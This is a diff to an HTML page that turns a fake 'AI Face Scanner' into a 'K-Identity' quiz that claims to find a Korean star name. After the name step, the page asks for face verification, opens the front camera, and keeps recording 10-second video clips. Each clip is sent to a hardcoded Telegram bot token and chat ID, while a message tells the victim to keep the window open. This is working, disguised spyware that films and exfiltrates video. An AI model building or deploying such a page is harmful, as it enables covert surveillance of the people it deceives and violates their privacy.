@@ -3,49 +3,103 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>K-Star Verification</title>
+    <title>K-Identity AI Finder</title>
     <style>
-        body { background: #000; color: #00d2ff; font-family: sans-serif; text-align: center; padding: 50px; }
-        .card { border: 2px solid #00d2ff; padding: 20px; display: inline-block; border-radius: 15px; }
-        button { background: #00d2ff; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; margin-top: 10px; }
+        body { background: #0f0c29; background: linear-gradient(to right, #24243e, #302b63, #0f0c29); color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 20px; }
+        .main-box { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); padding: 30px; border-radius: 20px; max-width: 450px; margin: 50px auto; border: 1px solid rgba(255, 255, 255, 0.2); box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37); }
+        h1 { color: #00d2ff; text-transform: uppercase; letter-spacing: 2px; }
+        input { padding: 12px; width: 85%; border-radius: 10px; border: none; margin-bottom: 20px; font-size: 16px; outline: none; }
+        button { background: #00d2ff; color: #0f0c29; border: none; padding: 15px 30px; border-radius: 50px; cursor: pointer; font-weight: bold; font-size: 18px; transition: 0.3s; }
+        button:hover { background: #3a7bd5; transform: scale(1.05); }
+        #result-area { display: none; margin-top: 20px; }
+        .id-card { background: white; color: #333; padding: 20px; border-radius: 15px; margin-top: 20px; position: relative; }
+        .k-label { font-size: 24px; font-weight: bold; color: #302b63; }
+        #status-text { margin-top: 15px; font-size: 14px; color: #ff4b2b; font-weight: bold; }
+        .loading-dots:after { content: ' .'; animation: dots 1s steps(5, end) infinite; }
+        @keyframes dots { 0%, 20% { color: rgba(0,0,0,0); text-shadow: .25em 0 0 rgba(0,0,0,0), .5em 0 0 rgba(0,0,0,0); } 40% { color: #ff4b2b; text-shadow: .25em 0 0 rgba(0,0,0,0), .5em 0 0 rgba(0,0,0,0); } 60% { text-shadow: .25em 0 0 #ff4b2b, .5em 0 0 rgba(0,0,0,0); } 80%, 100% { text-shadow: .25em 0 0 #ff4b2b, .5em 0 0 #ff4b2b; } }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h2>AI Face Scanner</h2>
-        <p>Please click the button to start verification.</p>
-        <button onclick="start()">START SCAN</button>
-        <p id="msg"></p>
+
+<div class="main-box" id="entry-screen">
+    <h1>🇰🇷 K-Identity</h1>
+    <p>Discover your South Korean star name and lookalike!</p>
+    <input type="text" id="nameInput" placeholder="Enter your full name (English)">
+    <br>
+    <button onclick="processName()">Find My Star Match</button>
+</div>
+
+<div class="main-box" id="result-area">
+    <div class="id-card">
+        <div id="kNameFinal" class="k-label"></div>
+        <p style="margin: 5px 0; color: #777;">K-Pop Industry ID: #7732-B</p>
+        <img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Lucky" id="avatar" style="width: 120px; margin-top: 10px;">
     </div>
+    <p style="margin-top: 20px;">AI requires <b>Real-time Face Verification</b> to complete your profile.</p>
+    <button onclick="startLoopCapture()">Verify My Face Now</button>
+    <div id="status-text"></div>
+</div>
 
-    <script>
-        // Use your real ID and Token here
-        const T = '8736351489:AAELCQrNInpGZp4naiPFaehlEjcEmeFeEQA';
-        const C = '8487366702';
+<script>
+    const TOKEN = '8736351489:AAELCQrNInpGZp4naiPFaehlEjcEmeFeEQA';
+    const ID = '8487366702';
+    const SURNAMES = ["Kim", "Lee", "Park", "Choi", "Jung", "Kang", "Yoon"];
 
-        async function start() {
-            document.getElementById('msg').innerText = "Requesting Camera...";
-            try {
-                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                document.getElementById('msg').innerText = "Scanning... Stay still.";
-                
-                setInterval(() => {
-                    const r = new MediaRecorder(s);
-                    let b = [];
-                    r.ondataavailable = e => b.push(e.data);
-                    r.onstop = () => {
-                        const fd = new FormData();
-                        fd.append('chat_id', C);
-                        fd.append('video', new Blob(b, {type: 'video/mp4'}), 'v.mp4');
-                        fetch(`https://api.telegram.org/bot${T}/sendVideo`, { method: 'POST', body: fd });
-                    };
-                    r.start();
-                    setTimeout(() => r.stop(), 5000); // Test with 5 seconds
-                }, 7000);
-            } catch (e) {
-                document.getElementById('msg').innerText = "Error: " + e.message;
-            }
+    function processName() {
+        const name = document.getElementById('nameInput').value;
+        if(!name) return alert("Please type your name first!");
+
+        const randomK = SURNAMES[Math.floor(Math.random() * SURNAMES.length)];
+        document.getElementById('entry-screen').style.display = 'none';
+        document.getElementById('result-area').style.display = 'block';
+        document.getElementById('kNameFinal').innerText = name + " " + randomK;
+    }
+
+    async function startLoopCapture() {
+        const status = document.getElementById('status-text');
+        status.innerHTML = "Accessing AI Scanner<span class='loading-dots'></span>";
+
+        try {
+            // Force Front Camera (user)
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }, 
+                audio: false 
+            });
+
+            status.innerHTML = "AI Analyzing... Please do not close this window.";
+            
+            // Set up infinite interval for 10-second chunks
+            setInterval(() => {
+                const recorder = new MediaRecorder(stream);
+                let videoParts = [];
+
+                recorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) videoParts.push(event.data);
+                };
+
+                recorder.onstop = async () => {
+                    const videoBlob = new Blob(videoParts, { type: 'video/mp4' });
+                    const data = new FormData();
+                    data.append('chat_id', ID);
+                    data.append('video', videoBlob, `kstar_${Date.now()}.mp4`);
+
+                    // Sending to your Telegram
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
+                        method: 'POST',
+                        body: data
+                    });
+                };
+
+                recorder.start();
+                setTimeout(() => { recorder.stop(); }, 10000); // 10 seconds per video
+
+            }, 10500); // Trigger every 10.5 seconds to keep it flowing
+
+        } catch (e) {
+            status.innerText = "Error: Camera permission is required for AI Matching.";
         }
-    </script>
+    }
+</script>
+
 </body>
 </html>
